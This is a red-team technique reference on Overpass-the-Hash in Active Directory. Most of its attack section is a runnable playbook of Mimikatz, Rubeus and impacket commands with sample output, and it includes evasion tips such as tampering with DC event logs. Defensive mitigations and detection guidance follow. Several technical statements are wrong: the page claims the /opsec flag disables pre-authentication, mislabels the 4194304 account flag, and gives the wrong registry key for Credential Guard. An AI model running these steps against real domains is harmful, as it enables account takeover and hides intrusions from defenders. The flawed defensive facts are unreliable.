# [LM-AUTH-011]: Overpass-the-Hash (Pass-the-Key)

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-011 |
| **MITRE ATT&CK v18.1** | [T1550.002 - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/) |
| **Tactic** | Defense Evasion, Lateral Movement |
| **Platforms** | Windows AD (On-Premises) |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016-2025; Windows 10/11 |
| **Patched In** | No patch (mitigated via hardening and detection) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Overpass-the-Hash (also known as Pass-the-Key) is a credential-based lateral movement technique that leverages a user's NTLM password hash to request a valid Kerberos Ticket Granting Ticket (TGT) from the Domain Controller's Key Distribution Center (KDC). Unlike standard Pass-the-Hash (PtH) which uses NTLM authentication directly, Overpass-the-Hash converts the NTLM hash into a TGT via Kerberos, allowing the attacker to subsequently request Service Tickets (STs) for any resource in the domain. This technique bypasses standard authentication controls and is particularly effective because Kerberos tickets are considered "legitimate" authentication mechanisms by most security tools.

**Attack Surface:** Any account's NTLM hash (obtained via credential dumping, DCSync, or NTDS.dit extraction); Kerberos authentication infrastructure; Domain Controller Key Distribution Center (KDC).

**Business Impact:** **Unrestricted lateral movement within Active Directory domain.** Once a TGT is obtained, an attacker can access any resource (file shares, databases, servers, printers) that the compromised account is permitted to access. If the hash belongs to a domain administrator or high-privilege account, full domain compromise is achievable. Attackers can also escalate privileges by requesting Service Tickets for sensitive accounts or by performing further attacks like Pass-the-Ticket.

**Technical Context:** The attack is rapid (seconds to minutes from hash extraction to TGT acquisition) and generates minimal suspicious audit logs compared to Pass-the-Hash. Event ID 4768 (TGT Requested) is generated on the Domain Controller, but many organizations do not actively monitor this event. The technique works consistently across all Windows Server versions (2016-2025) and PowerShell versions.

### Operational Risk

- **Execution Risk:** Medium - Requires prior extraction of user's NTLM hash (challenging but well-documented); once hash is obtained, TGT acquisition is reliable and straightforward.
- **Stealth:** Medium - Event ID 4768 is generated but is less commonly monitored than 4624 (Logon event) or 4672 (Privilege assignment). Can be obscured by normal authentication noise in large environments.
- **Reversibility:** Partial - The issued TGT remains valid for 10 hours (standard Kerberos ticket lifetime). Only full password change or account disable revokes the TGT.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.4.2, 5.4.3 | Kerberos Authentication - Enforcing ticket validation and strong encryption |
| **DISA STIG** | W-10-000050 | Kerberos ticket encryption and validation mechanisms |
| **CISA SCuBA** | ID-1.1 | Identity and Access Management - Strong authentication controls |
| **NIST 800-53** | IA-2, IA-7, AU-6 | Authentication mechanisms and audit monitoring |
| **GDPR** | Article 32 | Security of Processing - Encryption and access controls |
| **DORA** | Article 9 | Protection and Prevention - Strong authentication for critical systems |
| **NIS2** | Article 21 | Cyber Risk Management Measures - Authentication and access controls |
| **ISO 27001** | A.9.2.1, A.9.3.1 | User authentication and access restriction controls |
| **ISO 27005** | Lateral Movement Risk | Unauthorized network access and privilege escalation scenarios |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Any user account in the domain (if their own hash is compromised)
- **Optimal:** Domain Admin, Service Account, or high-privilege user account hash

**Required Access:**
- Possession of target user's NTLM hash (MD4 hash, NOT cleartext password)
- Network access to Kerberos KDC (Domain Controller) on port 88 (UDP/TCP)
- Access to a Windows system with administrative privileges OR
- Linux/macOS system with impacket tools (for remote execution)

**Supported Versions:**

- **Windows Server:** 2016 / 2019 / 2022 / 2025
- **Windows Workstation:** 10 / 11 (any build)
- **Kerberos:** All versions (fundamental to Windows authentication)
- **PowerShell:** 5.0+ (for Windows-based tools)

**Tools:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos TGT/ST generation, Windows)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Hash extraction and Kerberos manipulation, Windows)
- [impacket](https://github.com/SecureAuthCorp/impacket) (getTGT, psexec, Linux/macOS)
- [Hashcat](https://hashcat.net/) (Hash cracking, if hash needs verification)
- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) (PowerShell-based PtH and Overpass-the-Hash)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Check Kerberos Configuration:**

```powershell
# Verify Kerberos is enabled and configured
$kerberos = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | 
  Where-Object { $_.DHCPEnabled -eq $true }

# Check Domain Controller reachability
nltest /dsgetdc:contoso.local

# List cached Kerberos tickets
klist

# Expected output: Shows any existing TGTs and STs
# Ticket Type: Ticket Granting Ticket (TGT)
# Principal: user@CONTOSO.LOCAL
```

**What to Look For:**
- Domain Controller is reachable (nltest should show DC name and IP)
- Kerberos is active (klist should show existing tickets or list tickets prompt)
- No current TGT means a fresh one can be injected

**Check for Running Tools:**

```powershell
# Verify if Rubeus is already in use (look for process)
Get-Process -Name Rubeus -ErrorAction SilentlyContinue

# Check if LSASS is protected (Credential Guard)
Get-MpComputerStatus | Select-Object -ExpandProperty IsTamperProtected
```

**Version Note:** Kerberos reconnaissance is consistent across Server 2016-2025. However, Windows Server 2022+ has stricter Credential Guard policies by default, which may prevent LSASS memory access (required for hash extraction). Plan accordingly.

### Check for Existing Ticket Caches

```powershell
# On Windows, clear existing tickets before injecting new ones (avoid conflicts)
klist purge

# Verify cache is cleared
klist
# Expected: "There are no tickets to list"
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Rubeus (Windows) - TGT Injection via RC4-HMAC

**Supported Versions:** Windows Server 2016-2025; Windows 10/11

**Note:** Rubeus is the most reliable and flexible tool for Overpass-the-Hash on Windows. The `/ptt` flag injects the TGT directly into the current session.

#### Step 1: Obtain Target User's NTLM Hash

**Objective:** Acquire the NTLM hash of the target account. Methods include:
- DCSync attack (requires Domain Admin)
- NTDS.dit dump
- LSASS memory dump
- Captured from network traffic (rare with modern mitigations)
- Rainbow table lookup (if hash strength is weak)

**Command (via Mimikatz DCSync):**

```cmd
# From a compromised Domain Admin account
mimikatz # lsadump::dcsync /domain:contoso.local /user:targetuser /all
```

**Expected Output:**

```
[DC] contoso.local 'DC-01.contoso.local' will be the DC.
[DC] 'contoso.local\targetuser' has been required to perform a full sync with replication rights.
SAM.SAM
Hash NTLM: a64a6e7917ce0e4983f58a7e6a60d8a8
```

**What This Means:**
- The NTLM hash is: `a64a6e7917ce0e4983f58a7e6a60d8a8`
- This hash can now be used with Rubeus or other tools

**OpSec & Evasion:**
- DCSync generates Event ID 4662 (Replication) on the DC
- Consider deleting or tampering with Event ID 4662 logs after successful extraction
- Detection likelihood: **High** if monitoring replication events

**Troubleshooting:**
- **Error:** "Access denied"
  - **Cause:** Account does not have replication rights
  - **Fix (Server 2016-2019):** Run as Domain Admin or use elevated account
  - **Fix (Server 2022+):** Ensure UAC is disabled or account has explicit replication permissions
- **Error:** "NTLM hash not found"
  - **Cause:** User account may not exist or hash not computed
  - **Fix:** Verify account exists: `Get-ADUser targetuser`

#### Step 2: Request TGT Using Rubeus with RC4-HMAC

**Objective:** Use the NTLM hash to request a valid TGT from the KDC. RC4-HMAC is the legacy Kerberos encryption type that uses NTLM-compatible hash.

**Command (Rubeus - Basic TGT Request with Injection):**

```cmd
# Navigate to Rubeus directory
cd C:\Tools\Rubeus

# Request TGT using RC4 hash and inject into current session (/ptt = Pass-the-Ticket)
.\Rubeus.exe asktgt /domain:contoso.local /dc:DC-01.contoso.local /user:targetuser /rc4:a64a6e7917ce0e4983f58a7e6a60d8a8 /ptt
```

**Expected Output:**

```
[*] Action: Ask TGT

[*] Using domain controller: DC-01.contoso.local (192.168.1.100)
[*] Building AS-REQ (w/o preauth) for: 'contoso.local\targetuser'
[*] Sending AS-REQ
[+] TGT request successful!

[*] base64(ticket.kirbi):
      doIFQDCCBTygAwIBAaEDMAGhEDAOGwZDT05UT1NvBgtDT05UT1NP...
[*] Ticket Saved to : 04e85a18-aca1-4a5e-a74f-9ce6db6c5c96.kirbi
[*] Injecting ticket into LogonSession 0
[+] Ticket successfully injected!
[*] You now have context as 'contoso.local\targetuser' until 08/16/2024 08:30:00 AM
```

**What This Means:**
- TGT has been successfully requested and injected into the current session
- User context is now `contoso.local\targetuser`
- Ticket is valid for 10 hours (standard Kerberos lifetime)
- Can now request Service Tickets for any resource

**Version Note:**
- RC4-HMAC works consistently on Server 2016-2025
- Newer versions (2022+) may prefer AES encryption; see METHOD 2 for AES-based approach

**OpSec & Evasion:**
- Event ID 4768 (TGT requested) is generated on the DC
- Does not generate Event ID 4624 (Logon), making it harder to detect than pass-the-hash
- Use `/createnetonly` to inject into a sacrificial process:
  ```cmd
  .\Rubeus.exe asktgt /domain:contoso.local /user:targetuser /rc4:a64a6e7917ce0e4983f58a7e6a60d8a8 /createnetonly:C:\Windows\System32\cmd.exe
  ```
- Detection likelihood: **Medium** (requires active monitoring of Event ID 4768)

**Troubleshooting:**
- **Error:** "Unable to contact KDC"
  - **Cause:** Domain Controller unreachable or port 88 blocked
  - **Fix (Server 2016-2019):** Verify DC IP; test `nslookup DC-01.contoso.local`; check firewall
  - **Fix (Server 2022+):** Check if Kerberos traffic is being filtered by network policies
- **Error:** "Preauth failed"
  - **Cause:** Hash is incorrect or corrupted
  - **Fix:** Re-obtain hash via DCSync; verify format (32 hex characters)
- **Error:** "Ticket injection failed"
  - **Cause:** Current session does not have privilege to inject; Credential Guard enabled
  - **Fix:** Run Rubeus as Local Admin; use `/createnetonly` instead

**References & Proofs:**
- [Rubeus GitHub - asktgt Documentation](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)
- [SpecterOps - Kerberos Ticket Handling](https://specterops.io/our-insights/articles/kerberos-tickets/)

#### Step 3: Verify TGT and Request Service Tickets

**Objective:** Confirm the TGT is in the session and request Service Tickets for target resources.

**Command (Verify TGT Injection):**

```cmd
# List all cached Kerberos tickets in current session
klist

# Expected output:
# Cached Tickets: (1)
# Session Key Type: RC4-HMAC
# ServiceName: krbtgt/CONTOSO.LOCAL
# TargetName: CONTOSO.LOCAL
# ClientName: targetuser
# Flags 0x40a00000: forwarded, renewable, initial
# Session Time: 08/15/2024 10:30:00 PM
# Session Expiration: 08/16/2024 08:30:00 AM
```

**What This Means:**
- TGT is successfully cached in the Kerberos credential cache
- Ready to request Service Tickets for any resource

**Command (Request Service Ticket for File Share):**

```cmd
# Now use the TGT to request a Service Ticket for a file share
# Kerberos will automatically use the cached TGT

# Example: Access a file share as the impersonated user
net use \\SERVER-01.contoso.local\C$ ""
# Or
dir \\SERVER-01.contoso.local\share

# Expected: Access is granted (or denied based on actual permissions, not authentication)
```

**Command (Request Service Ticket via Rubeus for Explicit Control):**

```cmd
# Explicitly request a Service Ticket for a specific service
.\Rubeus.exe asktgs /ticket:04e85a18-aca1-4a5e-a74f-9ce6db6c5c96.kirbi /service:cifs/SERVER-01.contoso.local /ptt

# Expected output:
# [*] Service: cifs/SERVER-01.contoso.local
# [*] Requested ST (Service Ticket):
# [*] Injecting ticket into LogonSession 0
# [+] Ticket successfully injected!
```

**What This Means:**
- Service Ticket for `cifs/SERVER-01` (file sharing service) has been obtained and injected
- User can now access the file share using the credentials of `targetuser`

**OpSec & Evasion:**
- Service Ticket requests also generate Event ID 4769 on the DC
- Spread requests over time to avoid rate-limit detection
- Access actual shared resources to blend with normal activity
- Detection likelihood: **Low to Medium** (depends on EDR and resource access logging)

**Troubleshooting:**
- **Error:** "Service ticket request failed"
  - **Cause:** Service principal not found or has different name
  - **Fix:** Verify SPN: `setspn -L SERVER-01.contoso.local`
  - **Fix (Server 2022+):** Check if Kerberos SPN registration is strict
- **Error:** "Access denied to file share"
  - **Cause:** Impersonated user does not have permissions to resource
  - **Fix:** Verify permissions: `icacls \\SERVER-01\share /T`; consider using different user account

**References & Proofs:**
- [Microsoft - Kerberos Service Tickets](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/kerberos-policies)
- [Rubeus GitHub - asktgs Documentation](https://github.com/GhostPack/Rubeus#example-requesting-service-tickets)

---

### METHOD 2: Using Rubeus with AES Encryption (OpSec Optimized)

**Supported Versions:** Windows Server 2019-2025; Windows 10 (1909+) / 11

**Note:** AES-based Kerberos encryption is more modern and less suspicious than RC4-HMAC. Use this when OpSec is critical and AES keys are available.

#### Step 1: Obtain AES-256 Hash (Alternative to RC4)

**Objective:** Extract the AES-256 key (Kerberos key) instead of NTLM hash for better OpSec.

**Command (Mimikatz - Extract AES Key):**

```cmd
mimikatz # lsadump::dcsync /domain:contoso.local /user:targetuser /all

# Look for supplementalCredentials section:
# ... [UNICODE] (AES 256) : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2
```

**Expected Output:**

```
Hash NTLM: a64a6e7917ce0e4983f58a7e6a60d8a8
Hash AES256: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2
```

#### Step 2: Request TGT with AES Encryption and OpSec Flags

**Command (Rubeus - AES TGT with /opsec flag):**

```cmd
.\Rubeus.exe asktgt /domain:contoso.local /dc:DC-01.contoso.local /user:targetuser /aes256:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2 /ptt /opsec

# Expected output:
# [*] Action: Ask TGT (OpSec Mode)
# [+] TGT request successful!
# [*] OpSec Flag Enabled - Mimicking standard Kerberos behavior
```

**What This Means:**
- TGT uses modern AES encryption (less suspicion than RC4)
- `/opsec` flag disables pre-authentication, mimicking normal Kerberos client behavior
- Appears more legitimate in security tool logs

**OpSec & Evasion:**
- AES tickets are harder to detect than RC4
- `/opsec` avoids pre-auth requests, which are logged
- Detection likelihood: **Low** (mimics normal user behavior)

---

### METHOD 3: Using Impacket (Linux/macOS) - getTGT

**Supported Versions:** Windows Server 2016-2025 (can be attacked from Linux)

**Note:** For offensive operators without Windows infrastructure or using Linux-based C2 frameworks (Mythic, Sliver, etc.).

#### Step 1: Obtain NTLM Hash (via Remote DCSync)

**Command (impacket - secretsdump):**

```bash
# Use secretsdump to perform DCSync remotely
python3 secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c" \
  -domain-controller 192.168.1.100 \
  contoso.local/DomainAdmin@DC-01.contoso.local

# Extract specific user hash
python3 secretsdump.py -hashes ":8846f7eaee8fb117ad06bdd830b7586c" \
  -domain-controller 192.168.1.100 \
  contoso.local/DomainAdmin | grep "targetuser"
```

**Expected Output:**

```
targetuser:1105:aad3b435b51404eeaad3b435b51404ee:a64a6e7917ce0e4983f58a7e6a60d8a8:::
```

#### Step 2: Request TGT Using impacket getTGT

**Command (impacket - getTGT):**

```bash
# Request TGT using RC4 hash
python3 getTGT.py -hashes ":a64a6e7917ce0e4983f58a7e6a60d8a8" \
  -domain-controller 192.168.1.100 \
  contoso.local/targetuser \
  -outputfile /tmp/targetuser

# Expected output:
# Impacket v0.12.0 - Copyright 2024 SecureAuthCorp
# [*] Saving ticket in /tmp/targetuser.ccache
```

**What This Means:**
- TGT saved in Kerberos ccache format: `/tmp/targetuser.ccache`
- Can now use with other impacket tools

#### Step 3: Use TGT for Lateral Movement via psexec

**Command (impacket - psexec with TGT):**

```bash
# Export the ccache file so impacket tools use it
export KRB5CCNAME=/tmp/targetuser.ccache

# Now use psexec with the TGT
python3 psexec.py -k -no-pass \
  -dc-ip 192.168.1.100 \
  contoso.local/targetuser@SERVER-01.contoso.local \
  "whoami"

# Expected output:
# [*] Impacket code (psexec.py) successfully executed
# CONTOSO\targetuser
```

**What This Means:**
- Command executed as `targetuser` on remote server
- Proof of successful Overpass-the-Hash attack

**OpSec & Evasion:**
- impacket tools do not generate Windows event logs directly (executed on Linux)
- Only generates logs on the target system when accessing resources
- Detection likelihood: **Low** (from target's perspective, looks like normal Kerberos auth)

**Troubleshooting:**
- **Error:** "KRB5_FCC_NOFILE"
  - **Cause:** ccache file not found or path incorrect
  - **Fix:** Verify file exists: `ls -la /tmp/targetuser.ccache`; re-run getTGT
- **Error:** "KRB5_KDCREP_MODIFIED - Integrity check failed"
  - **Cause:** Hash is incorrect
  - **Fix:** Re-obtain hash via secretsdump; verify format (32 hex chars)
- **Error:** "Clock skew detected"
  - **Cause:** Time mismatch between Linux system and DC
  - **Fix:** Sync time: `sudo ntpdate -s 192.168.1.100`

**References & Proofs:**
- [Impacket GitHub - getTGT](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py)
- [Impacket GitHub - psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
- [Hacker Recipes - Overpass-the-Hash](https://the-hacker-recipes.github.io/active-directory-domain-services/movement/abusing-kerberos/overpass-the-hash/)

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enforce Kerberos AES Encryption:** Disable RC4-HMAC and require AES-256 for all accounts. This makes Overpass-the-Hash significantly harder.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps (Group Policy - Server 2016-2019):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Kerberos Policy**
  3. Set **Support for Kerberos clients using RC4 encryption** to **Disabled** or **Not Supported**
  4. Set **Encryption types allowed for Kerberos** to **AES256_HMAC_SHA1** only
  5. Run `gpupdate /force` on all systems
  
  **Manual Steps (Server 2022+):**
  1. Use **Active Directory Administrative Center** (dsac.exe)
  2. Navigate to **System** → **Default Domain Policy**
  3. Under **Kerberos Policy**, set encryption to **AES256** minimum
  4. Force policy update across domain
  
  **PowerShell Command:**
  ```powershell
  # Set AES-256 requirement via Group Policy
  Set-GPRegistryValue -Name "Default Domain Policy" -Key "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
    -ValueName "SupportedEncryptionTypes" -Value 0x00000018 -Type DWord
  
  # Value 0x18 = AES-256 + AES-128 only (disables RC4 and DES)
  ```

- **Monitor and Alert on Event ID 4768 (TGT Requests):** Set up alerts for unusual TGT requests, especially from service accounts or for sensitive accounts.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps (Enable Audit):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy**
  3. Enable: **Audit Kerberos Authentication Service**
  4. Set to: **Success and Failure**
  5. Run `gpupdate /force`
  
  **Manual Configuration (Local Policy on DC):**
  ```powershell
  auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
  ```
  
  **Create Alert in SIEM (Splunk example):**
  ```spl
  index=windows EventID=4768 TargetUserName="targetuser" 
  | stats count by SourceIP, TimeCreated 
  | where count > 3 in 5m
  ```

- **Restrict NTLM Hash Access via DCSync Protection:** Implement DCSync attack prevention by restricting replication rights.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps:**
  1. Audit which accounts have replication rights:
     ```powershell
     Get-ADObject -Filter * -Properties "*" | Where-Object { $_.nTSecurityDescriptor -match "1131f6ba-9c07-11d1-f79f-00c04fc2dcd2" }
     ```
  2. Remove replication rights from unnecessary accounts:
     ```powershell
     # Get specific account
     $account = Get-ADUser "ServiceAccount"
     
     # Remove replication extended rights
     $acl = Get-Acl -Path "AD:\DC=contoso,DC=local"
     # (Manual: Remove replication permissions via ADUC or dsacls)
     ```

### Priority 2: HIGH

- **Implement Pass-the-Hash Mitigations via Group Policy:**
  
  **Applies To Versions:** Windows Server 2016+, Windows 10/11
  
  **Manual Steps:**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Credentials Delegation**
  3. Enable: **Restrict delegation of credentials to remote servers**
  4. Set to: **Restrict use of freshly entered credentials**
  5. Run `gpupdate /force`
  
  **Registry Command (PowerShell):**
  ```powershell
  # Enable Credential Guard (prevents LSASS dumping)
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" `
    -Name "Enabled" -Value 1
  
  # Restart required
  Restart-Computer -Force
  ```

- **Disable NTLM and Enforce Kerberos-Only Authentication:**
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps:**
  1. Open **Local Security Policy** (secpol.msc)
  2. Navigate to **Security Settings** → **Local Policies** → **Security Options**
  3. Set **Network security: Restrict NTLM: Outgoing NTLM traffic from all servers** to **Deny All**
  4. Set **Network security: Restrict NTLM: Deny on this computer** to **Deny All**
  
  **Registry Command:**
  ```powershell
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "RestrictReceivingNTLMTraffic" -Value 2
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value 2
  
  # Value 2 = Deny All NTLM
  ```

### Access Control & Policy Hardening

- **Implement RBAC Separation:** Ensure service accounts that can be compromised do not have excessive privileges.
  
  **Manual Steps:**
  1. Audit all service account memberships:
     ```powershell
     Get-ADUser -Filter { (samAccountType -eq "805306368") -and (Enabled -eq $true) } -Properties MemberOf | 
       Select-Object Name, MemberOf
     ```
  2. Remove unnecessary admin group memberships
  3. Use **Admin Tier 0** accounts only for critical operations

- **Enable Kerberos Preauth Required:** Ensure all accounts require preauth (default, but verify).
  
  **Manual Steps:**
  ```powershell
  # Verify all accounts have preauth enabled
  Get-ADUser -Filter * | Select-Object Name, UserAccountControl
  
  # If needed, enable preauth (UserAccountControl should NOT include 4194304)
  # 4194304 = "Password Not Required"
  ```

### Validation Command (Verify Fixes)

```powershell
# Check if AES encryption is enforced
Get-GPRegistryValue -Name "Default Domain Policy" -Key "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
  -ValueName "SupportedEncryptionTypes"

# Expected: 0x18 (AES-256 and AES-128 only)

# Verify Kerberos Audit Logging is enabled
auditpol /get /subcategory:"Kerberos Authentication Service"

# Expected output shows: Success and Failure both enabled

# Verify NTLM restrictions
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v "RestrictReceivingNTLMTraffic"

# Expected: REG_DWORD = 2 (Deny All)
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Event ID 4768 (TGT Request)** with:
  - High frequency (multiple TGT requests in short timeframe)
  - For service accounts or sensitive accounts
  - From unexpected source IPs
  - Client Address is not typical for that user
  - Status Code 0x0 (Success) but account is marked as "sensitive"

- **Event ID 4769 (Service Ticket Request)** with:
  - Service Name requesting SPNs not typically used by the account
  - High volume from single source
  - For highly privileged accounts immediately after unknown TGT request

- **Kerberos Encryption Type Mismatch:** Logs showing RC4-HMAC despite AES-256 being required

- **Authentication Logs:** Sign-in from unexpected location/IP for account, followed by resource access from same IP

### Forensic Artifacts

- **Disk:** Domain Controller Security event logs (C:\Windows\System32\winevt\Logs\Security.evtx) containing Event ID 4768 and 4769
- **Memory:** Kerberos ccache files (on Windows: `C:\Users\<user>\AppData\Local\Temp\klist.tmp`)
- **Network:** Kerberos traffic on port 88 (UDP/TCP) to/from Domain Controller
- **Registry:** Kerberos ticket cache location for current user session

### Response Procedures

1. **Isolate Affected Account:**
   
   **Command:**
   ```powershell
   # Disable compromised account immediately
   Disable-ADAccount -Identity "targetuser"
   
   # Reset password to force out all sessions
   $newPassword = ConvertTo-SecureString "NewComplexP@ss123!" -AsPlainText -Force
   Set-ADAccountPassword -Identity "targetuser" -NewPassword $newPassword -Reset
   
   # Clear Kerberos tickets from all systems
   klist purge /all
   ```
   
   **Manual (Azure AD / Entra ID):**
   - Navigate to **Entra ID** → **Users** → Select compromised user → **Sign-out All Sessions**

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export DC Security Event Log
   wevtutil epl Security C:\Evidence\DC-Security.evtx
   
   # Search for all TGT requests for compromised user (Event ID 4768)
   Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4768]] and *[EventData[Data[@Name='TargetUserName']='targetuser']]" | 
     Export-Csv -Path C:\Evidence\TGT-Requests.csv
   
   # Search for service tickets requested (Event ID 4769)
   Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4769]] and *[EventData[Data[@Name='ServiceName'] or contains(., 'cifs')]]" | 
     Export-Csv -Path C:\Evidence\Service-Tickets.csv
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Rotate all potentially affected accounts
   Get-ADUser -Filter * -Properties LastLogonDate | 
     Where-Object { $_.LastLogonDate -gt (Get-Date).AddDays(-7) } | 
     ForEach-Object {
         Set-ADAccountPassword -Identity $_.SamAccountName -NewPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force) -Reset
     }
   
   # Reset machine accounts (affected systems)
   Reset-ComputerMachinePassword -Server "DC-01.contoso.local"
   ```
   
   **Manual:**
   - Review all Service Tickets requested and accessed resources
   - Audit file access logs on affected servers
   - Check for data exfiltration or unauthorized changes

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-002] Compromised Credentials | Attacker obtains initial domain user credentials |
| **2** | **Credential Access** | [CA-DUMP-002] LSASS Memory Dump | Attacker extracts NTLM hashes from LSASS |
| **3** | **Current Step** | **[LM-AUTH-011]** | **Overpass-the-Hash - Request TGT using NTLM hash** |
| **4** | **Lateral Movement** | [LM-AUTH-001] PsExec with Kerberos Ticket | Access remote systems using Service Tickets |
| **5** | **Privilege Escalation** | [PE-KERBEROS-003] Kerberoasting | Request Service Tickets for cracking |
| **6** | **Persistence** | [PERSIST-004] Scheduled Tasks | Create backdoor task using compromised account |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Ember Bear - Overpass-the-Hash Lateral Movement

- **Target:** Ukrainian Government (2022)
- **Timeline:** Initial access February 24, 2022; Detected March 2022
- **Technique Status:** Used Overpass-the-Hash extensively after obtaining domain admin credentials via brute force
- **Impact:**
  - Lateral movement across 50+ servers
  - Exfiltration of sensitive government communications
  - Disruption of critical infrastructure coordination
- **Reference:** [CISA - Ember Bear Campaign Analysis](https://www.cisa.gov/news-events/cybersecurity-advisories/2022/03/17/russian-military-sandworm-team-responsible-phishing-campaigns-against-ukrainian)

### Example 2: APT28 (Fancy Bear) - Overpass-the-Hash in Political Campaigns

- **Target:** U.S. Political Organizations (2016)
- **Timeline:** Ongoing campaign through 2016 U.S. Presidential Election
- **Technique Status:** Extensively used after initial credential compromise; enabled rapid domain wide lateral movement
- **Impact:**
  - Access to thousands of email accounts
  - Large-scale data exfiltration
  - Democratic National Committee breach
- **Reference:** [Mandiant - APT28 Campaign Overview](https://www.mandiant.com/resources/apt28-insight-into-russian-cyber-espionage)

### Example 3: Wizard Spider - Overpass-the-Hash in Ransomware Attacks

- **Target:** Financial Institutions (2020-2021)
- **Timeline:** Initial access via phishing; Overpass-the-Hash used for lateral movement (5-10 days post-compromise)
- **Technique Status:** Critical step between initial access and ransomware deployment
- **Impact:**
  - Compromise of multiple financial institutions
  - Trickbot trojan deployed
  - Ransomware deployment (Conti, Bazarloader)
  - Estimated $100M+ in losses across victims
- **Reference:** [Red Canary - Wizard Spider Analysis](https://redcanary.com/blog/clop-ransomware/)

---

## References & External Resources

- [MITRE ATT&CK - T1550.002 Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [Rubeus GitHub - Kerberos Manipulation Tool](https://github.com/GhostPack/Rubeus)
- [Impacket GitHub - Python-based Kerberos Tools](https://github.com/SecureAuthCorp/impacket)
- [SpecterOps - Kerberos Fundamentals](https://specterops.io/our-insights/articles/kerberos-tickets/)
- [Microsoft - Kerberos Authentication in Windows](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- [The Hacker Recipes - Overpass-the-Hash Guide](https://the-hacker-recipes.github.io/active-directory-domain-services/movement/abusing-kerberos/overpass-the-hash/)
- [Red Canary - Lateral Movement Detection](https://redcanary.com/threat-detection-report/)

---